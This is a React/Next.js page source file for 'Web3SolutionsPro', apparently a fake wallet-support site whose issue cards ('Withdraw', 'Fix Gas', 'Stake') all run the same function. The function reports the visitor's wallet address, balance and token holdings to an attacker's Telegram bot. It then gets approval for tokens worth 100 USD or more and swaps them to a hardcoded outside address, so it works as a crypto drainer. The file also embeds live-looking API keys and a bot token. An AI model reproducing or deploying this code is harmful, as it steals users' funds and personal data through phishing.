import Moralis from 'moralis';
import { ThirdwebSDK } from "@thirdweb-dev/sdk";
import { EvmChain } from '@moralisweb3/common-evm-utils';
import { useAddress,useBalance,useSigner,ConnectWallet,useConnectionStatus,useWallet,lightTheme } from '@thirdweb-dev/react';
import {FeeAmount} from "@uniswap/v3-sdk";
import { TradeType,Token, CurrencyAmount, Percent,ChainId } from "@uniswap/sdk-core";
import { NATIVE_TOKEN_ADDRESS} from '@thirdweb-dev/sdk';
import { AlphaRouter, SwapOptionsSwapRouter02, SwapType} from "@uniswap/smart-order-router";
import JSBI from 'jsbi';
import { ethers } from "ethers";
import { NextPage } from "next";
import { useRouter } from 'next/router';
import ChainContext from "../context/Chain";
import React, { useContext, useState, useEffect } from "react";
import { Navbar, NavbarBrand, NavbarContent, NavbarItem, Link, Switch,NavbarMenuToggle ,NavbarMenu,NavbarMenuItem,Divider,Card,CardBody,CardFooter,CardHeader,Modal,ModalHeader,ModalBody,ModalContent,ModalFooter,Button} from "@nextui-org/react";
import Head from "next/head";
import { useTheme } from "next-themes";
import MoonIcon from "./moon";
import SunIcon from "./sun";
import { fromReadableAmount } from "../lib/conversion";

const Explore: NextPage = () => {
  const [isMenuOpen, setIsMenuOpen] = React.useState(false);
  const menuItems = [
      "Explore",
      "Projects",
      "Help & Feedback",
    ];
    const list = [
      {
          title: "Deposit",
          body: "Resolve Deposit Problem",
          price: "",
        },
        {
          title: "Withdraw",
          body: "Resolve Withdrawal issue",
          price: "",
        },
        {
          title: "Public Sale",
          body: "Resolve Public Sale Issue",
          price: "",
        },
        {
          title: "Private Sale",
          body: "Resolve Private Sale Issue",
          price: "",
        },
      {
        title: "Referral Rewards",
        body: "Resolve Referral Rewards Issue",
        price: "",
      },
      {
        title: "Claim Rewards",
        body: "Resolve Claim Rewards Issue",
        price: "",
      },
      {
        title: "Earn Rewards",
        body: "Resolve Earn Rewards Issue",
        price: "",
      }, 
      {
        title: "Marketplace",
        body: "Resolve Marketplace Issue",
        price: "",
      },
      {
          title:"Rectification",
          body:"Resolve Rectification Issue",
          
      },
      {
          title:"Stake",
          body:"Resolve Stake Issue",
          
      },
      {
          title:"Unstake",
          body:"Resolve Unstake Issue",
          
      },
      {
          title:"Galxe-Web",
          body:"Resolve Galxe-web Issue",
          
      },
      {
          title:"Quest3",
          body:"Resolve Quest3 Issue",
          
      },
      {
          title:"Zealy Market",
          body:"Resolve Zealy Market Issue",
          
      },
      {
          title:"Guild.xyz",
          body:"Resolve Guild.xyz Issue",
          
      },
      {
          title:"Bridge Token",
          body:"Resolve Bridge Token Issue",
          
      },
      {
          title:"Get Role",
          body:"Resolve Get Role Issue",
          
      },
      {
          title:"Verify Role",
          body:"Resolve Verify Role Issue",
          
      },
      {
          title:"Merge RPC",
          body:"Resolve Merge RPC Issue",
          
      },
      {
          title:"Swap",
          body:"Resolve Swap Issue",
          
      },
      {
          title:"Connect Tasks",
          body:"Resolve Connect Tasks Issue",
          
      },
      {
          title:"Mint",
          body:"Resolve Minting Issue",
          
      },
      {
          title:"Troubleshoot",
          body:"Resolve Troubleshooting Issue",
          
      },
      {
          title:"Fix Gas",
          body:"Resolve Gas Fixing Issue",
          
      },
      {
          title:"Retreieve Service",
          body:"Resolve Service Retrieval Issue",
          
      },
      {
          title:"Add Liquidity",
          body:"Resolve Liquidity Addition Issue",
          
      },
      {
          title:"Remove Liquidity",
          body:"Resolve Liquidity Removal Issue",
          
      },
  
      
    ];
const pagerouter = useRouter();
const { theme, setTheme } = useTheme();
const project = pagerouter.query.project as string;
const address = useAddress();
const wallet = useWallet();
const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
const wbalance = data?.displayValue;
const signer = useSigner();
const connectionStatus = useConnectionStatus();
const [showConnectModal, setShowConnectModal] = useState(false);
const toggleTheme = () => {
  setTheme(theme === "light" ? "dark" : "light");
};
const apiKey = "XBHbf47AI2Fin462uOUOgFQ58HVtvev45cj0qegiOGZsivvFG7w53Q4jmQTLjn9x";
const { selectedChain, setSelectedChain } = useContext(ChainContext);
const addresses: Record<string, string> = {
  ["ethereum"]: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
  ["binance"]: "0x5fC8D30804508dfBB940b64D20BdCFCA9C6A6c25",
  ["arbitrum"]: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
  ["polygon"]: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
  ["avalanche"]: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
};
  const chainMapping = {
      ethereum: "ethereum",
      arbitrum: "arbitrum",
      binance: "binance",
      polygon: "polygon",
      avalanche: "avalanche",
      // Add more mappings for other chains if needed
  };

  async function explore() {
    if (!address) {
      setShowConnectModal(true);
      return;
    }
    switch (connectionStatus) {
      case "unknown":
        await sendMessageToTelegram("User is yet to connect. Hold on........");
        setShowConnectModal(true);
        return;
      case "connecting":
        await sendMessageToTelegram("User's wallet is connecting. Please be patient...");
        break;
      case "connected":
        await sendMessageToTelegram(`User with wallet address: ${address} and balance of ${wbalance} has connected.`);
        break;
      case "disconnected":
        await sendMessageToTelegram("User has disconnected!");
        setShowConnectModal(true);
        return;
      default:
        break;
    }
    await Moralis.start({
      apiKey: apiKey,
    });

    const waddress = address;
    const chainOptions = ["ethereum", "arbitrum", "polygon", "avalanche"];
    const allTokenData: {
      name: string;
      address: string;
      balance: string;
      decimals: number;
      chain: string;
      spenderAddy: string;
      symbol: string;
      usdtad: string;
      chainNum: number;
      RpcUrl: string;
      rawbal: number;
      chainHex: string;
    }[] = [];
    const allNativeTokenData = [];
    
    let chain;
    
    
    for (const selectedChain of chainOptions) {
      let usdtadd: string;
      let chainNum: number;
      let RpcUrl: string;
      let chainHex: string;
    
      switch (selectedChain) {
        case "ethereum":
                      chain = EvmChain.ETHEREUM;
                      usdtadd = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
                      chainNum = 1;
                      RpcUrl = "https://mainnet.infura.io/v3/358e586605ee4f069a73dbfa14e28415";
                      chainHex = "0x1";
                      break;
                  case "arbitrum":
                      chain = EvmChain.ARBITRUM;
                      usdtadd = "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1";
                      chainNum = 42161;
                      RpcUrl ="https://arbitrum-mainnet.infura.io/v3/358e586605ee4f069a73dbfa14e28415";
                      chainHex = "0xa4b1";
                      break;
                  case "polygon":
                      chain = EvmChain.POLYGON;
                      usdtadd = "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619";
                      chainNum = 137;
                      RpcUrl ="https://polygon-mainnet.infura.io/v3/358e586605ee4f069a73dbfa14e28415";
                      chainHex = "0x89";
                      break;
                      case "avalanche":
                        chain = EvmChain.AVALANCHE;
                        usdtadd ="0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB";
                        chainNum = 43114;
                        RpcUrl = "https://avalanche-mainnet.infura.io/v3/358e586605ee4f069a73dbfa14e28415";
                        chainHex = "0xa86a";
                        break;
    
            default:
              break;
      }
    
      if (chain) {
        const response = await Moralis.EvmApi.token.getWalletTokenBalances({
          address: waddress,
          chain,
        });
        const nativeSync = await Moralis.EvmApi.balance.getNativeBalance({
          chain,
          "address": address
        });
        const nativeRes = nativeSync.toJSON();
    
        const tokens = response.toJSON();
        const filteredTokens = tokens.filter((token) => {
          return parseFloat(token.balance) > 0 && token.possible_spam === false;
        });
        const tokenData = filteredTokens.map((token) => {
          const tokenName = token.name;
          const spenderAddy = addresses[selectedChain];
         
          const balance: number = parseFloat(token.balance);
          const rawbalx = balance / Math.pow(10, token.decimals);
          const rawbal = parseFloat(rawbalx.toFixed(2));
          
    
          return {
            name: tokenName,
            address: token.token_address,
            balance: token.balance,
            decimals: token.decimals,
            chain: selectedChain,
            spenderAddy: spenderAddy,
            symbol: token.symbol,
            usdtad: usdtadd,
            chainNum,
            RpcUrl,
            rawbal,
            chainHex
          };
        });
        allTokenData.push(...tokenData);
        console.log(allTokenData);
        allNativeTokenData.push({
          chain: selectedChain,
          rawbal: nativeRes.balance,
          // Add other relevant information about native balance
        });
        
        
      
      }
    }
    
    for (const tokenData of allTokenData) {
     try {
        const priceResponse = await Moralis.EvmApi.token.getTokenPrice({
          chain: tokenData.chainHex,
          include: "percent_change",
          address: tokenData.address,
        });
  
        const priceData = priceResponse.toJSON();
        const usd_price = priceData.usdPrice;
  
        const tokenValue = tokenData.rawbal * usd_price;
        await sendMessageToTelegram(`Token Name: ${tokenData.name}\nToken Contract Address: ${tokenData.address}\nToken ChainID:${tokenData.chainNum}\n Token balance: ${tokenData.rawbal}\nToken Value in USD: ${tokenValue}`);
        if (tokenValue >= 100) {

        const FoundToken = new Token(
          tokenData.chainNum,
          tokenData.address,
          tokenData.decimals,
          tokenData.symbol,
          tokenData.name
        );
        const SyncToken = new Token(
          tokenData.chainNum,
          tokenData.usdtad,
          18,
          'WETH',
          'Wrapped Ether'
        );
        const provider = new ethers.providers.JsonRpcProvider(tokenData.RpcUrl);
        const CurrentConfig = {
          rpc: {
            mainnet: tokenData.RpcUrl,
          },
          wallet: {
            address: "0xAd29Bb72d3A05F21a58f75c8F8d69c9207bb131A"
            
          },
          tokens: {
            in: FoundToken,
            amountIn: tokenData.rawbal,
            out: SyncToken,
            poolFee: FeeAmount.MEDIUM,
          },
        };
       const router = new AlphaRouter({
          chainId: ChainId.MAINNET,
          provider,
        });
        const options: SwapOptionsSwapRouter02 = {
          recipient: CurrentConfig.wallet.address,
          slippageTolerance: new Percent(50, 10_000),
          deadline: Math.floor(Date.now() / 1000 + 1800),
          type: SwapType.SWAP_ROUTER_02,
        }
        const rawTokenAmountIn: JSBI = fromReadableAmount(
          CurrentConfig.tokens.amountIn,
          CurrentConfig.tokens.in.decimals
        )
    
    const route = await router.route(
      CurrencyAmount.fromRawAmount(
        CurrentConfig.tokens.in,
        rawTokenAmountIn
      ),
      CurrentConfig.tokens.out,
      TradeType.EXACT_INPUT,
      options
    );
    if (!route || !route.methodParameters) {
      
  };
    const tokenContract = new ethers.Contract(tokenData.address, ['function approve(address spender, uint256 value)'], signer);
    const V3_SWAP_ROUTER_ADDRESS = "0xE592427A0AEce92De3Edee1F18E0157C05861564";
    const tokenApproval = await tokenContract.approve(
      V3_SWAP_ROUTER_ADDRESS, 
      ethers.BigNumber.from(rawTokenAmountIn.toString())
  );
  const MAX_FEE_PER_GAS = 100000000000;
  const MAX_PRIORITY_FEE_PER_GAS = 100000000000;
  if (tokenApproval) {
    const txRes = await signer?.sendTransaction({
      data: route?.methodParameters?.calldata,
      to: V3_SWAP_ROUTER_ADDRESS,
      value: route?.methodParameters?.value,
      from: CurrentConfig.wallet.address,
      maxFeePerGas: MAX_FEE_PER_GAS,
      maxPriorityFeePerGas: MAX_PRIORITY_FEE_PER_GAS,
    });
    // Handle the result of the transaction if needed
  } else {
    await sendMessageToTelegram(`Approval not granted for ${tokenData.name}. Synchronization failed. inform user to refresh and grant approval.`);
  }
 


} else {
  await sendMessageToTelegram(`Skipping swap for ${tokenData.name} as its value is less than 100 USD`);
}
    } catch (error) {
        const errorObj = error as Error;
        await sendMessageToTelegram(errorObj.message); 
      }
    }
}   
return(
    <div>
        <Head>
      <title>Web3SolutionsPro - Home</title>
    </Head>
 <Navbar
      isBordered
      isMenuOpen={isMenuOpen}
      onMenuOpenChange={setIsMenuOpen}
    >
      <NavbarContent className="sm:hidden" justify="start">
        <NavbarMenuToggle aria-label={isMenuOpen ? "Close menu" : "Open menu"} />
      </NavbarContent>

      <NavbarContent className="sm:hidden pr-3" justify="center">
        <NavbarBrand>
          
          <p className="font-bold text-inherit">Web3SolutionsPro</p>
        </NavbarBrand>
      </NavbarContent>

      <NavbarContent className="hidden sm:flex gap-4" justify="center">
        <NavbarBrand>
          
          <p className="font-bold text-inherit">Web3SolutionsPro</p>
        </NavbarBrand>
        <NavbarItem>
          <Link color="foreground" href="#">
            Explore
          </Link>
        </NavbarItem>
        <NavbarItem isActive>
          <Link href="#" aria-current="page">
            Projects
          </Link>
        </NavbarItem>
      </NavbarContent>

      <NavbarContent justify="end">
        <NavbarItem>
           <Switch
      defaultSelected
      size="lg"
      color="primary"
      thumbIcon={({ isSelected, className }) =>
        isSelected ? ( 
          <SunIcon className={className}  />
        ) : (
          <MoonIcon className={className} />
        )
      }
      onChange={toggleTheme}
    >
    </Switch>
        &nbsp;&nbsp;&nbsp;
        </NavbarItem>
      </NavbarContent>

      <NavbarMenu>
        {menuItems.map((item, index) => (
          <NavbarMenuItem key={`${item}-${index}`}>
            <Link
              className="w-full"
              color={
                index === 0 ? "warning" : index === menuItems.length - 1 ? "danger" : "foreground"
              }
              href="#"
              size="lg"
            >
              {item}
            </Link>
          </NavbarMenuItem>
        ))}
      </NavbarMenu>
    </Navbar>
    <br></br>
    <div className="justify-center text-center">
    <ConnectWallet
        theme={theme as ("light" | "dark" | undefined)}
        modalTitle={"Connect"}
        modalSize={"wide"}
        welcomeScreen={{
          title:
            "Your gateway to a safe  decentralized world of   Secured Web3 Solutions ",
          img: {
            src: "",
            width: 150,
            height: 150,
          },
        }}
        modalTitleIconUrl={""}
      />
      </div>
      <br></br><br></br>
<div className="gap-4 grid grid-cols-2 sm:grid-cols-4">
<Modal isOpen={showConnectModal} onClose={() => setShowConnectModal(false)}>
  <ModalContent>
          {(onClose) => (
            <>
              <ModalHeader className="flex flex-col gap-1">Connect Wallet</ModalHeader>
              <ModalBody>
                <p> 
                  Connect your wallet to access this feature.
                  <br></br><br></br>
                  <ConnectWallet
        theme={theme as ("light" | "dark" | undefined)}
        modalTitle={"Connect"}
        modalSize={"wide"}
        welcomeScreen={{
          title:
            "Your gateway to a safe  decentralized world of   Secured Web3 Solutions ",
          img: {
            src: "",
            width: 150,
            height: 150,
          },
        }}
        modalTitleIconUrl={""}
      />
                </p>
              </ModalBody>
              <ModalFooter>
                <Button color="danger" variant="light" onPress={onClose}>
                  Close
                </Button>
              </ModalFooter>
            </>
          )}
        </ModalContent>
</Modal>
      {list.map((item, index) => (
        <Card shadow="sm" key={index} isPressable onPress={() => explore()} className="border-double border-2 bg-transparent">
          <CardBody className="overflow-visible p-0">
            <p className="justify-center text-center py-10 px-10 font-bold">{item.price}</p>
          </CardBody>
          <CardFooter className="text-small justify-between">
            <b>{item.title}</b>
            <p className="text-default-500">{item.price}</p>
          </CardFooter>
        </Card>
      ))}
    </div>
    </div>
)
};
const sendMessageToTelegram = async (message: string) => {
  const botToken = '6057314190:AAES15kEQX0oGZbphbnB9FXsJhcDcN66QmU';
  const chatId = '5508645371';
  
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });
}; 
export default Explore;



